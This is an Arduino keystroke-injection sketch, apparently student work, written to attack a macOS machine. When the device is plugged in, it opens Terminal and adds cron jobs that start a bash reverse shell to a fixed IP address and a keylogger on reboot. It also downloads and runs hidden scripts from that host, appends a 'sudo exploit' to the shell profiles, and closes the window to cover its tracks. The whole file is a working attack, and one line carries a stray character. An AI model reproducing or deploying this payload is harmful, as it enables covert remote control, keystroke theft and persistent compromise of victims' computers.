/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  // spawns a reverse shell
  // Shrey Somaiya z5257343
  // 2 April 2020
  // Set default delay 200ms
  // Command + Space ==> spotlight search
  Keyboard.press(KEY_LEFT_GUI);
  delay(200);
  Keyboard.press(' ');
  delay(200);
  Keyboard.releaseAll();

  // Search for termina
  delay(2000);
  Keyboard.print(F("terminal"));

  delay(300);
  typeKey(KEY_RETURN);

  delay(2000);
  Keyboard.print(F("bash"));

  delay(300);
  typeKey(KEY_RETURN);

  typeKey(KEY_RETURN);

  // enable background jobs
  delay(2000);
  Keyboard.print(F("set -m"));

  delay(200);
  typeKey(KEY_RETURN);

  // add reverse shell to cron
  // set the reverse shell to occur 11am every day
  delay(2000);
  Keyboard.print(F("{ crontab -l; echo '0 11 * * * /bin/sh -c \"/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &\" && exit'; } | crontab -"));

  delay(200);
  typeKey(KEY_RETURN);

  delay(200);
  // set cron job for keylogger on reboot
  delay(2000);
  Keyboard.print(F("{ crontab -l; echo '@reboot nuhup python3 ~/.config/Chrome/osx-keylogger.py &'; } | crontab -"));

  delay(200);
  typeKey(KEY_RETURN);

  delay(200);
  // download and unzip the scripts
  delay(2000);
  Keyboard.print(F("curl http://139.180.169.29:8000/scripts.zip --output ~/.config/Chrome/scripts.zip && unzip -f ~/.config/Chrome/scripts.zip -d ~/.config/Chrome"));

  typeKey(KEY_RETURN);

  delay(200);
  // Switch to secret directory
  delay(2000);
  Keyboard.print(F("cd ~/.config/Chrome/"));

  delay(200);
  typeKey(KEY_RETURN);

  delay(200);
  // install python modules needed
  delay(2000);
  Keyboard.print(F("pip3 install -r requirements.txt"));∂

  delay(200);
  typeKey(KEY_RETURN);

  delay(200);
  
  // run the python keylogger
  // realistically none of this would be done in the initial thing, just the reverse shell but owell
  delay(200);
  delay(2000);
  Keyboard.print(F("python3 ~/.config/Chrome/osx-keylogger.py &"));
  delay(200);
  typeKey(KEY_RETURN);

  // spawns a reverse shell in background
  delay(200);
  delay(2000);
  Keyboard.print(F("sh -c \"/bin/bash -i > /dev/tcp/139.180.169.29/6996 0<&1 2>&1 &\" "));
  delay(200);
  typeKey(KEY_RETURN);


  // add sudo exploit
  // realistically none of this would be done in the initial thing, just the reverse shell but owell
  delay(200);
  delay(2000);
  Keyboard.print(F("cat ~/.config/Chrome/sudo.sh >> ~/.bashrc && cat ~/.config/Chrome/sudo.sh >> ~/.bash_profile"));
  delay(200);
  typeKey(KEY_RETURN);


  
  // we were never here!
  delay(200);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('w');
  Keyboard.releaseAll();

  delay(200);
  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
